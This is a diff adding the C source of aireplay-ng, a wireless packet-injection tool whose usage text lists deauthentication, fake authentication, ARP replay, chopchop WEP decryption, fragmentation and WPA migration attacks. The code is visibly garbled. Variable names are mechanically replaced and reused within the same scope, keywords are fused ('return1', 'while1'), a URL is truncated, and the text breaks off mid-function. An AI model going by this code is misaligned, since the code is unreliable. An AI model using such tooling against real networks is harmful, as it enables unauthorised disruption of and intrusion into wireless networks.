@@ -1,0 +1,6840 @@
+
+
+
+
+
+
+
+
+int bitrates[12]={1000000, 2000000, 5500000, 6000000, 9000000, 11000000, 12000000, 18000000, 24000000, 36000000, 48000000, 54000000};
+
+extern char * fn_0(char * progname, int var_1, int var_117, int var_3, int var_4, int var_5, int var_31);
+extern int fn_7(unsigned char *mac1, unsigned char *mac2);
+extern unsigned char * fn_8(char * macAddress, int var_9, unsigned char * mac);
+extern int fn_10( unsigned char *buf, int var_117 );
+extern const unsigned long int crc_tbl[256];
+extern const unsigned char crc_chop_tbl[256][4];
+
+char usage[] =
+
+"\n"
+"  %s - (C) 2006-2013 Thomas d\'Otreppe\n"
+"  http:
+"\var_122"
+"  usage: aireplay-ng <options> <replay interface>\var_122"
+"\var_122"
+"  Filter options:\var_122"
+"\var_122"
+"      -b bssid  : MAC address, Access Point\var_122"
+"      -d dmac   : MAC address, Destination\n"
+"      -s smac   : MAC address, Source\n"
+"      -m len    : minimum packet length\n"
+"      -n len    : maximum packet length\n"
+"      -u type   : frame control, type    field\n"
+"      -v subt   : frame control, subtype field\n"
+"      -t tods   : frame control, To      DS bit\n"
+"      -f fromds : frame control, From    DS bit\n"
+"      -w iswep  : frame control, WEP     bit\n"
+"      -D        : disable AP detection\n"
+"\n"
+"  Replay options:\n"
+"\n"
+"      -x nbpps  : number of packets per second\n"
+"      -p fctrl  : set frame control word (hex)\n"
+"      -a bssid  : set Access Point MAC address\n"
+"      -c dmac   : set Destination  MAC address\n"
+"      -h smac   : set Source       MAC address\n"
+"      -g value  : change ring buffer size (default: 8)\n"
+"      -F        : choose first matching packet\n"
+"\n"
+"      Fakeauth attack options:\n"
+"\n"
+"      -e essid  : set target AP SSID\n"
+"      -o npckts : number of packets per burst (0=auto, default: 1)\n"
+"      -q sec    : seconds between keep-alives\n"
+"      -Q        : send reassociation requests\n"
+"      -y prga   : keystream for shared key auth\n"
+"      -T n      : exit after retry fake auth request n time\n"
+"\n"
+"      Arp Replay attack options:\n"
+"\n"
+"      -j        : inject FromDS packets\n"
+"\n"
+"      Fragmentation attack options:\n"
+"\n"
+"      -k IP     : set destination IP in fragments\n"
+"      -l IP     : set source IP in fragments\n"
+"\n"
+"      Test attack options:\n"
+"\n"
+"      -B        : activates the bitrate test\n"
+"\n"
+
+
+
+
+
+
+"  Source options:\n"
+"\n"
+"      -i iface  : capture packets from this interface\n"
+"      -r file   : extract packets from this pcap file\n"
+"\n"
+"  Miscellaneous options:\n"
+"\n"
+"      -R                    : disable /dev/rtc usage\n"
+"      --ignore-negative-one : if the interface's channel can't be determined,\n"
+"                              ignore the mismatch, needed for unpatched cfg80211\n"
+"\n"
+"  Attack modes (numbers can still be used):\n"
+"\n"
+"      --deauth      count : deauthenticate 1 or all stations (-0)\n"
+"      --fakeauth    delay : fake authentication with AP (-1)\n"
+"      --interactive       : interactive frame selection (-2)\n"
+"      --arpreplay         : standard ARP-request replay (-3)\n"
+"      --chopchop          : decrypt/chopchop WEP packet (-4)\n"
+"      --fragment          : generates valid keystream   (-5)\n"
+"      --caffe-latte       : query a client for new IVs  (-6)\n"
+"      --cfrag             : fragments against a client  (-7)\n"
+"      --migmode           : attacks WPA migration mode  (-8)\n"
+"      --test              : tests injection and quality (-9)\n"
+"\n"
+"      --help              : Displays this usage screen\n"
+"\n";
+
+
+struct struct_13
+{
+    unsigned char f_bssid[6];
+    unsigned char f_dmac[6];
+    unsigned char f_smac[6];
+    int f_minlen;
+    int f_maxlen;
+    int f_type;
+    int f_subtype;
+    int f_tods;
+    int f_fromds;
+    int f_iswep;
+
+    int r_nbpps;
+    int r_fctrl;
+    unsigned char r_bssid[6];
+    unsigned char r_dmac[6];
+    unsigned char r_smac[6];
+    unsigned char r_dip[4];
+    unsigned char r_sip[4];
+    char r_essid[33];
+    int r_fromdsinj;
+    char r_smac_set;
+
+    char ip_out[16];
+    char ip_in[16];
+    int port_out;
+    int port_in;
+
+    char *iface_out;
+    char *s_face;
+    char *s_file;
+    unsigned char *prga;
+
+    int a_mode;
+    int a_count;
+    int a_delay;
+ int f_retry;
+
+    int ringbuffer;
+    int ghost;
+    int prgalen;
+
+    int delay;
+    int npackets;
+
+    int fast;
+    int bittest;
+
+    int nodetect;
+    int ignore_negative_one;
+    int rtc;
+
+    int reassoc;
+}
+opt;
+
+struct struct_14
+{
+    int fd_in, arptype_in;
+    int fd_out, arptype_out;
+    int fd_rtc;
+
+    unsigned char mac_in[6];
+    unsigned char mac_out[6];
+
+    int is_wlanng;
+    int is_hostap;
+    int is_madwifi;
+    int is_madwifing;
+    int is_bcm43xx;
+
+    FILE *f_cap_in;
+
+    struct struct_122 pfh_in;
+}
+dev;
+
+static struct struct_46 *var_122, *var_122;
+
+struct struct_85
+{
+    unsigned char *buf;
+    int hdrlen;
+    int len;
+};
+
+struct struct_117
+{
+    unsigned char set;
+    unsigned char found;
+    unsigned char len;
+    unsigned char essid[255];
+    unsigned char bssid[6];
+    unsigned char chan;
+    unsigned int ping[30];
+    int pwr[30];
+};
+
+struct struct_117 ap[20];
+
+unsigned long nb_pkt_sent;
+unsigned char h80211[4096];
+unsigned char tmpbuf[4096];
+unsigned char srcbuf[4096];
+char strbuf[512];
+
+unsigned char ska_auth1[] = "\xb0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                        "\x00\x00\x00\x00\x00\x00\xb0\x01\x01\x00\x01\x00\x00\x00";
+
+unsigned char ska_auth3[4096] = "\xb0\x40\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                        "\x00\x00\x00\x00\x00\x00\xc0\x01";
+
+
+int ctrl_c, alarmed;
+
+char * iwpriv;
+
+
+void fn_21( int var_23 )
+{
+    if( var_23 == SIGINT )
+        ctrl_c++;
+
+    if( var_23 == SIGALRM )
+        alarmed++;
+}
+
+int fn_23()
+{
+
+    if(var_122 != var_122)
+    {
+        if(var_122)
+        {
+            wi_close(var_122);
+            var_122 = NULL;
+        }
+        if(var_122)
+        {
+            wi_close(var_122);
+            var_122 = NULL;
+        }
+    }
+    else
+    {
+        if(var_122)
+        {
+            wi_close(var_122);
+            var_122 = NULL;
+            var_122 = NULL;
+        }
+    }
+
+
+    var_122 = wi_open(opt.iface_out);
+    if (!var_122)
+        return 1;
+    dev.fd_out = wi_fd(var_122);
+
+
+    if( opt.s_face != NULL )
+    {
+        var_122 = wi_open(opt.s_face);
+        if (!var_122)
+            return 1;
+        dev.fd_in = wi_fd(var_122);
+        wi_get_mac(var_122, dev.mac_in);
+    }
+    else
+    {
+        var_122 = var_122;
+        dev.fd_in = dev.fd_out;
+
+
+        dev.arptype_in = dev.arptype_out;
+        wi_get_mac(var_122, dev.mac_in);
+    }
+
+    wi_get_mac(var_122, dev.mac_out);
+
+    return 0;
+}
+
+int fn_24(struct struct_46 *wi, int var_27)
+{
+    int var_122, newrate;
+
+    if( wi_set_rate(wi, var_27) )
+        return 1;
+
+
+
+
+
+    if (var_27 == 5500000 && wi_get_rate(wi) != 5500000) {
+ if( wi_set_rate(wi, 5000000) )
+     return 1;
+    }
+
+    newrate = wi_get_rate(wi);
+    for(var_122=0; var_122<12; var_122++)
+    {
+        if(bitrates[var_122] == var_27)
+            break;
+    }
+    if(var_122==12)
+        var_122=-1;
+    if( newrate != var_27 )
+    {
+        if(var_122!=-1)
+        {
+            if( var_122>0 )
+            {
+                if(bitrates[var_122-1] >= newrate)
+                {
+                    printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (var_27/1000000.0), (wi_get_rate(wi)/1000000.0));
+                    return 1;
+                }
+            }
+            if( var_122<11 )
+            {
+                if(bitrates[var_122+1] <= newrate)
+                {
+                    printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (var_27/1000000.0), (wi_get_rate(wi)/1000000.0));
+                    return 1;
+                }
+            }
+            return 0;
+        }
+        printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (var_27/1000000.0), (wi_get_rate(wi)/1000000.0));
+        return 1;
+    }
+    return 0;
+}
+
+int fn_27(void *buf, size_t var_31)
+{
+ struct struct_46 *wi = var_122;
+ unsigned char *pkt = (unsigned char*) buf;
+
+ if( (var_31 > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)
+ {
+  pkt[22] = (nb_pkt_sent & 0x0000000F) << 4;
+  pkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+ }
+
+ if (wi_write(wi, buf, var_31, NULL) == -1) {
+  switch (errno) {
+  case EAGAIN:
+  case ENOBUFS:
+   usleep(10000);
+   return 0;
+  }
+
+  perror("wi_write()");
+  return -1;
+ }
+
+ nb_pkt_sent++;
+ return 0;
+}
+
+int fn_29(void *buf, size_t var_31, struct struct_116 *ri)
+{
+ struct struct_46 *wi = var_122;
+ int var_31;
+
+        var_31 = wi_read(wi, buf, var_31, ri);
+        if (var_31 == -1) {
+            switch (errno) {
+            case EAGAIN:
+                    return 0;
+            }
+
+            perror("wi_read()");
+            return -1;
+        }
+
+ return var_31;
+}
+
+void fn_31( int var_35 )
+{
+    struct struct_112 tv, tv2, tv3;
+    int var_117;
+    fd_set rfds;
+
+    gettimeofday(&tv, NULL);
+    gettimeofday(&tv2, NULL);
+
+    tv3.tv_sec=0;
+    tv3.tv_usec=10000;
+
+    while( ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) < (var_35) )
+    {
+        FD_ZERO( &rfds );
+        FD_SET( dev.fd_in, &rfds );
+
+        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv3 ) < 0 )
+        {
+            continue;
+        }
+
+        if( FD_ISSET( dev.fd_in, &rfds ) )
+            var_117 = read_packet( h80211, sizeof( h80211 ), NULL );
+
+        gettimeofday(&tv2, NULL);
+    }
+}
+
+
+int fn_35( unsigned char *h80211, int var_117 )
+{
+    int z, var_82, var_82, var_82, var_40=0, qos;
+
+    if(var_117 <= 0)
+        return1;
+
+    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+    if ( ( h80211[0] & 0x80 ) == 0x80 )
+    {
+        qos = 1;
+        z+=2;
+    }
+
+    if( (h80211[0] & 0x0C) == 0x08)
+        var_40 = z-24;
+
+
+    if( var_117-var_40 < opt.f_minlen ||
+        var_117-var_40 > opt.f_maxlen ) return1;
+
+
+
+    if( ( h80211[0] & 0x0C ) != ( opt.f_type << 2 ) &&
+        opt.f_type >= 0 ) return1;
+
+    if( ( h80211[0] & 0x70 ) != (( opt.f_subtype << 4 ) & 0x70) &&
+        opt.f_subtype >= 0 ) return1;
+
+    if( ( h80211[1] & 0x01 ) != ( opt.f_tods ) &&
+        opt.f_tods >= 0 ) return1;
+
+    if( ( h80211[1] & 0x02 ) != ( opt.f_fromds << 1 ) &&
+        opt.f_fromds >= 0 ) return1;
+
+    if( ( h80211[1] & 0x40 ) != ( opt.f_iswep << 6 ) &&
+        opt.f_iswep >= 0 ) return1;
+
+
+
+    if( opt.f_type == 2 && opt.f_iswep == 1 &&
+        ( h80211[z + 3] & 0x20 ) != 0 ) return1;
+
+
+
+    switch( h80211[1] & 3 )
+    {
+        case 0: var_82 = 16; var_82 = 10; var_82 = 4; break;
+        case 1: var_82 = 4; var_82 = 10; var_82 = 16; break;
+        case 2: var_82 = 10; var_82 = 16; var_82 = 4; break;
+        default: var_82 = 10; var_82 = 16; var_82 = 24; break;
+    }
+
+    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) != 0 )
+        if( memcmp( h80211 + var_82, opt.f_bssid, 6 ) != 0 )
+            return1;
+
+    if( memcmp( opt.f_smac, NULL_MAC, 6 ) != 0 )
+        if( memcmp( h80211 + var_82, opt.f_smac, 6 ) != 0 )
+            return1;
+
+    if( memcmp( opt.f_dmac, NULL_MAC, 6 ) != 0 )
+        if( memcmp( h80211 + var_82, opt.f_dmac, 6 ) != 0 )
+            return1;
+
+
+
+    return0;
+}
+
+int fn_40(unsigned char *bssid, unsigned char *capa, char *essid)
+{
+    int var_117 = 0, var_101 = 0, var_101 = 0, var_101 = 0, var_101 = 0;
+    unsigned char pkt_sniff[4096];
+    struct struct_112 tv,tv2;
+    char essid2[33];
+
+    gettimeofday(&tv, NULL);
+    while 1
+    {
+        var_117 = 0;
+        while (var_117 < 22)
+        {
+            var_117 = read_packet(pkt_sniff, sizeof(pkt_sniff), NULL);
+
+            gettimeofday(&tv2, NULL);
+            if(((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 10000000)
+            {
+                return -1;
+            }
+            if(var_117 <= 0) usleep(1);
+        }
+        if (! memcmp(pkt_sniff, "\x80", 1))
+        {
+            var_101 = 0;
+            var_101 = 22;
+            var_101+= 12;
+            do
+            {
+                var_101 += var_101 + 2;
+                var_101 = pkt_sniff[var_101];
+                var_101 = pkt_sniff[var_101+1];
+            } while(var_101 != 3 && var_101 < var_117-2);
+
+            if(var_101 != 3) continue;
+            if(var_101 != 1) continue;
+            if(var_101+2+var_101 > var_117) continue;
+
+            var_101 = pkt_sniff[var_101+2];
+
+            if(essid)
+            {
+                var_101 = 0;
+                var_101 = 22;
+                var_101+= 12;
+                do
+                {
+                    var_101 += var_101 + 2;
+                    var_101 = pkt_sniff[var_101];
+                    var_101 = pkt_sniff[var_101+1];
+                } while(var_101 != 0 && var_101 < var_117-2);
+
+                if(var_101 != 0) continue;
+                if(var_101 <= 1)
+                {
+                    if (memcmp(bssid, pkt_sniff+10, 6) == 0) break;
+                    else continue;
+                }
+                if(var_101+2+var_101 > var_117) continue;
+
+                if(var_101 > 32)var_101 = 32;
+
+                if((pkt_sniff+var_101+2)[0] < 32 && memcmp(bssid, pkt_sniff+10, 6) == 0)
+                {
+                    break;
+                }
+
+
+                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) == 0)
+                {
+                    memset(essid, 0, 33);
+                    memcpy(essid, pkt_sniff+var_101+2, var_101);
+                    break;
+                }
+
+
+                if(bssid != NULL && memcmp(bssid, NULL_MAC, 6) == 0 && strncasecmp(essid, (char*)pkt_sniff+var_101+2, var_101) == 0 && strlen(essid) == (unsigned)var_101)
+                {
+                    memset(essid, 0, 33);
+                    memcpy(essid, pkt_sniff+var_101+2, var_101);
+                    memcpy(bssid, pkt_sniff+10, 6);
+                    printf("Found BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\" to given ESSID \"%s\".\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], essid);
+                    break;
+                }
+
+
+                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) > 0)
+                {
+                    memset(essid2, 0, 33);
+                    memcpy(essid2, pkt_sniff+var_101+2, var_101);
+                    if(strncasecmp(essid, essid2, var_101) == 0 && strlen(essid) == (unsigned)var_101)
+                        break;
+                    else
+                    {
+                        printf("For the given BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\", there is an ESSID mismatch!\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+                        printf("Found ESSID \"%s\" vs. specified ESSID \"%s\"\n", essid2, essid);
+                        printf("Using the given one, double check it to be sure its correct!\n");
+                        break;
+                    }
+                }
+            }
+        }
+    }
+
+    if(capa) memcpy(capa, pkt_sniff+34, 2);
+
+    return var_101;
+}
+
+
+
+
+int fn_45(unsigned char* bssid, char* essid, unsigned char* capa, struct struct_46 *wi)
+{
+    int var_48=0, var_48=0;
+
+    var_48 = wi_get_channel(wi);
+
+    if(var_48 == -1 && !opt.ignore_negative_one)
+    {
+        PCT; printf("Couldn't determine current channel for %s, you should either force the operation with --ignore-negative-one or apply a kernel patch\n",
+                wi_get_ifname(wi));
+        return -1;
+    }
+
+    if(bssid != NULL)
+    {
+        var_48 = wait_for_beacon(bssid, capa, essid);
+        if(var_48 < 0)
+        {
+            PCT; printf("No such BSSID available.\n");
+            return -1;
+        }
+        if((var_48 != var_48) && (var_48 != -1 || !opt.ignore_negative_one))
+        {
+            PCT; printf("%s is on channel %d, but the AP uses channel %d\n", wi_get_ifname(wi), var_48, var_48);
+            return -1;
+        }
+    }
+
+    return 0;
+}
+
+int fn_48( unsigned char* capa, int var_51, int var_51)
+{
+    unsigned char *bssid;
+
+    if(opt.nodetect)
+        return 0;
+
+    if(var_51)
+        bssid = opt.f_bssid;
+    else
+        bssid = opt.r_bssid;
+
+
+    if( memcmp(bssid, NULL_MAC, 6) )
+    {
+        PCT; printf("Waiting for beacon frame (BSSID: %02X:%02X:%02X:%02X:%02X:%02X) on channel %d\n",
+                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],wi_get_channel(var_122));
+    }
+    else if(strlen(opt.r_essid) > 0)
+    {
+        PCT; printf("Waiting for beacon frame (ESSID: %s) on channel %d\n", opt.r_essid,wi_get_channel(var_122));
+    }
+    else if(var_51)
+    {
+        PCT;
+        if(var_51)
+        {
+            printf("Please specify at least a BSSID (-b) or an ESSID (-e)\n");
+        }
+        else
+        {
+            printf("Please specify at least a BSSID (-a) or an ESSID (-e)\n");
+        }
+        return1;
+    }
+    else
+        return 0;
+
+    if( attack_check(bssid, opt.r_essid, capa, var_122) != 0)
+    {
+        if(memcmp(bssid, NULL_MAC, 6))
+        {
+            if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
+            {
+                printf( "Please specify an ESSID (-e).\n" );
+            }
+        }
+
+        if(!memcmp(bssid, NULL_MAC, 6))
+        {
+            if(strlen(opt.r_essid) > 0)
+            {
+                printf( "Please specify a BSSID (-a).\n" );
+            }
+        }
+        return1;
+    }
+
+    return 0;
+}
+
+int fn_51(unsigned char *ph80211, unsigned char *keystream, int var_117)
+{
+    int var_122=0;
+
+    for (var_122=0; var_122<var_117; var_122++) {
+        ph80211[var_122] = ph80211[var_122] ^ keystream[var_122];
+    }
+
+    return 0;
+}
+
+int fn_52( int *var_117, int var_61 )
+{
+    time_t tr;
+    struct struct_112 tv;
+    struct struct_99 *lt;
+
+    fd_set rfds;
+    long nb_pkt_read;
+    int var_122, var_117, var_122, var_82=0, var_82=0, var_82=0, var_61=0, var_61=0, var_61=0, key_index_offset;
+    int var_122, z;
+
+    FILE *f_cap_out;
+    struct struct_122 pfh_out;
+    struct struct_95 pkh;
+
+    if( opt.f_minlen < 0 ) opt.f_minlen = 40;
+    if( opt.f_maxlen < 0 ) opt.f_maxlen = 1500;
+    if( opt.f_type < 0 ) opt.f_type = 2;
+    if( opt.f_subtype < 0 ) opt.f_subtype = 0;
+    if( opt.f_iswep < 0 ) opt.f_iswep = 1;
+
+    tr = time( NULL );
+
+    nb_pkt_read = 0;
+
+    signal( SIGINT, SIG_DFL );
+
+    while1
+    {
+        if( time( NULL ) - tr > 0 )
+        {
+            tr = time( NULL );
+            printf( "\rRead %ld packets...\r", nb_pkt_read );
+            fflush( stdout );
+        }
+
+        if( opt.s_file == NULL )
+        {
+            FD_ZERO( &rfds );
+            FD_SET( dev.fd_in, &rfds );
+
+            tv.tv_sec = 1;
+            tv.tv_usec = 0;
+
+            if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
+            {
+                if( errno == EINTR ) continue;
+                perror( "select failed" );
+                return1;
+            }
+
+            if( ! FD_ISSET( dev.fd_in, &rfds ) )
+                continue;
+
+            gettimeofday( &tv, NULL );
+
+            *var_117 = read_packet( h80211, sizeof( h80211 ), NULL );
+
+            if( *var_117 < 0 ) return1;
+            if( *var_117 == 0 ) continue;
+        }
+        else
+        {
+
+
+            var_122 = sizeof( pkh );
+
+            if( fread( &pkh, var_122, 1, dev.f_cap_in ) != 1 )
+            {
+                printf( "\r\33[KEnd of file.\n" );
+                return1;
+            }
+
+            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {
+                SWAP32( pkh.caplen );
+                SWAP32( pkh.len );
+            }
+
+            tv.tv_sec = pkh.tv_sec;
+            tv.tv_usec = pkh.tv_usec;
+
+            var_122 = *var_117 = pkh.caplen;
+
+            if( var_122 <= 0 || var_122 > (int) sizeof( h80211 ) || var_122 > (int) sizeof( tmpbuf ) )
+            {
+                printf( "\r\33[KInvalid packet length %d.\n", var_122 );
+                return1;
+            }
+
+            if( fread( h80211, var_122, 1, dev.f_cap_in ) != 1 )
+            {
+                printf( "\r\33[KEnd of file.\n" );
+                return1;
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
+            {
+
+
+                if( h80211[7] == 0x40 )
+                    var_122 = 64;
+                else
+                    var_122 = *(int *)( h80211 + 4 );
+
+                if( var_122 < 8 || var_122 >= (int) *var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, *var_117 );
+                *var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, *var_117 );
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )
+            {
+
+
+                var_122 = *(unsigned short *)( h80211 + 2 );
+
+                if( var_122 <= 0 || var_122 >= (int) *var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, *var_117 );
+                *var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, *var_117 );
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )
+            {
+
+
+                var_122 = le16_to_cpu(*(unsigned short *)( h80211 + 2));
+
+                if( var_122 <= 0 || var_122>= (int) *var_117 )
+                    continue;
+
+
+                if ( var_122 == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )
+                    var_122 = 32;
+
+                if( var_122 <= 0 || var_122>= (int) *var_117 )
+                    continue;
+
+                memcpy( tmpbuf, h80211, *var_117 );
+                *var_117 -= var_122;
+                memcpy( h80211, tmpbuf + var_122, *var_117 );
+            }
+        }
+
+        nb_pkt_read++;
+
+        if( filter_packet( h80211, *var_117 ) != 0 )
+            continue;
+
+        if(opt.fast)
+            break;
+
+        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+        if ( ( h80211[0] & 0x80 ) == 0x80 )
+            z+=2;
+
+        switch( h80211[1] & 3 )
+        {
+            case 0: var_82 = 16; var_82 = 10; var_82 = 4; var_61 = 0; break;
+            case 1: var_82 = 4; var_82 = 10; var_82 = 16; var_61 = 0; break;
+            case 2: var_82 = 10; var_82 = 16; var_82 = 4; var_61 = 0; break;
+            case 3: var_61 = 10; var_61 = 4; var_82 = 16; var_82 = 24; var_61 = 1; break;
+        }
+
+        printf( "\n\n        Size: %d, FromDS: %d, ToDS: %d",
+                *var_117, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );
+
+        if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
+        {
+
+
+            key_index_offset = z+3;
+
+            if( ( h80211[key_index_offset] & 0x20 ) == 0 )
+                printf( " (WEP)" );
+            else
+                printf( " (WPA)" );
+        }
+
+        printf( "\n\n" );
+
+        if (var_61) {
+            printf( "        Transmitter  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
+                    h80211[var_61 ], h80211[var_61 + 1],
+                    h80211[var_61 + 2], h80211[var_61 + 3],
+                    h80211[var_61 + 4], h80211[var_61 + 5] );
+
+            printf( "           Receiver  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
+                    h80211[var_61 ], h80211[var_61 + 1],
+                    h80211[var_61 + 2], h80211[var_61 + 3],
+                    h80211[var_61 + 4], h80211[var_61 + 5] );
+        } else {
+            printf( "              BSSID  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
+                    h80211[var_82 ], h80211[var_82 + 1],
+                    h80211[var_82 + 2], h80211[var_82 + 3],
+                    h80211[var_82 + 4], h80211[var_82 + 5] );
+        }
+
+        printf( "          Dest. MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
+                h80211[var_82 ], h80211[var_82 + 1],
+                h80211[var_82 + 2], h80211[var_82 + 3],
+                h80211[var_82 + 4], h80211[var_82 + 5] );
+
+        printf( "         Source MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
+                h80211[var_82 ], h80211[var_82 + 1],
+                h80211[var_82 + 2], h80211[var_82 + 3],
+                h80211[var_82 + 4], h80211[var_82 + 5] );
+
+
+
+        for( var_122 = 0; var_122 < *var_117; var_122++ )
+        {
+            if( ( var_122 & 15 ) == 0 )
+            {
+                if( var_122 == 224 )
+                {
+                    printf( "\n        --- CUT ---" );
+                    break;
+                }
+
+                printf( "\n        0x%04x:  ", var_122 );
+            }
+
+            printf( "%02x", h80211[var_122] );
+
+            if( ( var_122 & 1 ) != 0 )
+                printf( " " );
+
+            if( var_122 == *var_117 - 1 && ( ( var_122 + 1 ) & 15 ) != 0 )
+            {
+                for( var_117 = ( ( var_122 + 1 ) & 15 ); var_117 < 16; var_117++ )
+                {
+                    printf( "  " );
+                    if( ( var_117 & 1 ) != 0 )
+                        printf( " " );
+                }
+
+                printf( " " );
+
+                for( var_117 = 16 - ( ( var_122 + 1 ) & 15 ); var_117 < 16; var_117++ )
+                    printf( "%c", ( h80211[var_122 - 15 + var_117] < 32 ||
+                                    h80211[var_122 - 15 + var_117] > 126 )
+                                  ? '.' : h80211[var_122 - 15 + var_117] );
+            }
+
+            if( var_122 > 0 && ( ( var_122 + 1 ) & 15 ) == 0 )
+            {
+                printf( " " );
+
+                for( var_117 = 0; var_117 < 16; var_117++ )
+                    printf( "%c", ( h80211[var_122 - 15 + var_117] < 32 ||
+                                    h80211[var_122 - 15 + var_117] > 127 )
+                                  ? '.' : h80211[var_122 - 15 + var_117] );
+            }
+        }
+
+        printf( "\n\nUse this packet ? " );
+        fflush( stdout );
+        var_122=0;
+        while(!var_122) var_122 = scanf( "%s", tmpbuf );
+        printf( "\n" );
+
+        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )
+            break;
+    }
+
+    if(!var_61)
+    {
+        pfh_out.magic = TCPDUMP_MAGIC;
+        pfh_out.version_major = PCAP_VERSION_MAJOR;
+        pfh_out.version_minor = PCAP_VERSION_MINOR;
+        pfh_out.thiszone = 0;
+        pfh_out.sigfigs = 0;
+        pfh_out.snaplen = 65535;
+        pfh_out.linktype = LINKTYPE_IEEE802_11;
+
+        lt = localtime( (const time_t *) &tv.tv_sec );
+
+        memset( strbuf, 0, sizeof( strbuf ) );
+        snprintf( strbuf, sizeof( strbuf ) - 1,
+                "replay_src-%02d%02d-%02d%02d%02d.cap",
+                lt->tm_mon + 1, lt->tm_mday,
+                lt->tm_hour, lt->tm_min, lt->tm_sec );
+
+        printf( "Saving chosen packet in %s\n", strbuf );
+
+        if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
+        {
+            perror( "fopen failed" );
+            return1;
+        }
+
+        var_122 = sizeof( struct struct_122 );
+
+        if( fwrite( &pfh_out, var_122, 1, f_cap_out ) != 1 )
+        {
+         fclose(f_cap_out);
+            perror( "fwrite failed\n" );
+            return1;
+        }
+
+        pkh.tv_sec = tv.tv_sec;
+        pkh.tv_usec = tv.tv_usec;
+        pkh.caplen = *var_117;
+        pkh.len = *var_117;
+
+        var_122 = sizeof( pkh );
+
+        if( fwrite( &pkh, var_122, 1, f_cap_out ) != 1 )
+        {
+         fclose(f_cap_out);
+            perror( "fwrite failed" );
+            return1;
+        }
+
+        var_122 = pkh.caplen;
+
+        if( fwrite( h80211, var_122, 1, f_cap_out ) != 1 )
+        {
+         fclose(f_cap_out);
+            perror( "fwrite failed" );
+            return1;
+        }
+
+        fclose( f_cap_out );
+    }
+
+    return0;
+}
+
+int fn_61(unsigned char **dest, char *file)
+{
+    FILE *f;
+    int var_96;
+
+    if(file == NULL) return1;
+    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);
+
+    f = fopen(file, "r");
+
+    if(f == NULL)
+    {
+         printf("Error opening %s\n", file);
+         return1;
+    }
+
+    fseek(f, 0, SEEK_END);
+    var_96 = ftell(f);
+    rewind(f);
+
+    if(var_96 > 1500) var_96 = 1500;
+
+    if( fread( (*dest), var_96, 1, f ) != 1 )
+    {
+     fclose(f);
+        fprintf( stderr, "fread failed\n" );
+        return1;
+    }
+
+    opt.prgalen = var_96;
+
+    fclose(f);
+    return0;
+}
+
+void fn_63(unsigned char *input, int var_117, int var_66)
+{
+    unsigned long var_66 = 0xFFFFFFFF;
+    int var_122=0;
+
+    for( var_122 = var_66; var_122 < var_117; var_122++ )
+        var_66 = crc_tbl[(var_66 ^ input[var_122]) & 0xFF] ^ (var_66 >> 8);
+
+    var_66 = ~var_66;
+
+    input[var_117] = (var_66 ) & 0xFF;
+    input[var_117+1] = (var_66 >> 8) & 0xFF;
+    input[var_117+2] = (var_66 >> 16) & 0xFF;
+    input[var_117+3] = (var_66 >> 24) & 0xFF;
+
+    return;
+}
+
+void fn_66(unsigned char *packet, int var_71, unsigned char *iv, unsigned char *keystream, int var_71, int var_81)
+{
+    int t, u;
+    int data_size;
+    unsigned char frag[32+var_71];
+    int pack_size;
+    int var_71=24;
+
+    data_size = var_71-var_71;
+    packet[23] = (rand() % 0xFF);
+
+    for (t=0; t+=var_71;)
+    {
+
+
+        memcpy(frag, packet, var_71);
+
+
+        memcpy(frag+var_71, iv, 4);
+
+
+        if(var_71 <= var_71-(var_71+t-var_71))
+            memcpy(frag+var_71+4, packet+var_71+t-var_71, var_71);
+        else
+            memcpy(frag+var_71+4, packet+var_71+t-var_71, var_71-(var_71+t-var_71));
+
+
+        if(!var_81)
+        {
+            frag[1] |= 1;
+            frag[1] &= 253;
+        }
+
+
+        if (t< data_size) frag[1] |= 4;
+        if (t>=data_size) frag[1] &= 251;
+
+
+        frag[22] = 0;
+        for (u=t; u-=var_71;)
+        {
+            frag[22] += 1;
+        }
+
+
+
+        if(var_71 <= var_71-(var_71+t-var_71))
